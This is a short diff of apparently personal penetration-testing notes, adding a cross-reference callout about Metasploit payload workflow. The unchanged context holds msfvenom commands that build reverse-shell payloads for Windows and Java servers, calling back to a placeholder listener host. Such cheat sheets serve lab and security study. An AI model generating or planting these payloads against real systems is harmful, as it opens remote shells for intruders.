@@ -16,3 +16,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o she
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
 ```
+
+
+> [!tip] Metasploit payload workflow
+> For staged vs non-staged payloads, `msfvenom`, matching listeners, and `exploit/multi/handler`, see [[Basics/Metasploit/Payloads - msfvenom - multi-handler|Metasploit Payloads — msfvenom and multi/handler]].
